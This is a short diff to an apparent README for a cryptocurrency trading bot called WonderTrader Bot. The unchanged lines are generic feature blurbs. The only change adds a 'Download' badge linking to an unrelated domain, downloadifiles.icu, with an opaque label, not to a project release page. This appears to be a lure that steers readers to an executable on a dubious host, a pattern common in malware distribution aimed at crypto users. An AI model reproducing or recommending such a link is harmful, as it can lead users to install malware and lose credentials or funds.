@@ -1,5 +1,8 @@
 **WonderTrader Bot** is an automated cryptocurrency trading bot that allows users to execute trades on various cryptocurrency exchanges based on predefined strategies and market analysis. It is designed to help both beginners and experienced traders automate their trading process, reducing the need for constant monitoring of the markets. The bot uses technical indicators, market trends, and trading algorithms to generate buy and sell signals, making decisions on behalf of the user to optimize trade execution.
 
+[![Download WonderTrader](https://img.shields.io/badge/Download-WonderTrader%20Bot-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9
+)
+
 **Key Features of WonderTrader Bot:**
 - **Automated Trading:** Executes trades automatically based on preset strategies, saving time and effort for traders.
 - **Multiple Exchange Support:** Compatible with various cryptocurrency exchanges, enabling users to trade across different platforms.
